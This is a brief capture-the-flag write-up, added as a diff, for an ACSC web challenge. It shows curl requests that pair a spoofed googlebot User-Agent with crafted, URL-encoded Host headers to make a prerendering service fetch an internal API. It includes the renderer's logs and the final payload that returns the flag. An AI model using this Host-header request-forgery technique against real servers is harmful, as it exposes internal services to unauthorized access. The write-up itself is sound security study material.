@@ -1,0 +1,31 @@
+curl 'http://myip:5000' -H 'User-Agent: googlebot' -H 'Host: api:8000'
+```
+renderer_1  | 2021-09-20T16:54:19.181Z getting http://api/
+```
+
+curl 'http://myip:5000' -H 'User-Agent: googlebot' -H 'Host: api%3a8000'
+```
+renderer_1  | 2021-09-20T16:53:20.537Z getting http://api/:8000/
+```
+
+curl 'http://myip:5000' -H 'User-Agent: googlebot' -H 'Host: api%3a8000@foo'
+```
+renderer_1  | 2021-09-20T16:55:57.534Z getting http://api:8000@foo/
+```
+
+curl 'http://myip:5000' -H 'User-Agent: googlebot' -H 'Host: api%3a8000?@foo'
+```
+renderer_1  | 2021-09-20T16:59:28.646Z getting http://api/:8000?@foo/
+```
+
+curl 'http://myip:5000' -H 'User-Agent: googlebot' -H 'Host: api%3a8000%3f@foo'
+```
+<html><head></head><body>ACSC{this_is_fake}</body></html>
+```
+
+Final Payload
+
+curl 'http://favorite-emojis.chal.acsc.asia:5000' -H 'User-Agent: googlebot' -H 'Host: api%3a8000%3f@foo'
+```
+<html><head></head><body>ACSC{sharks_are_always_hungry}</body></html>
+```
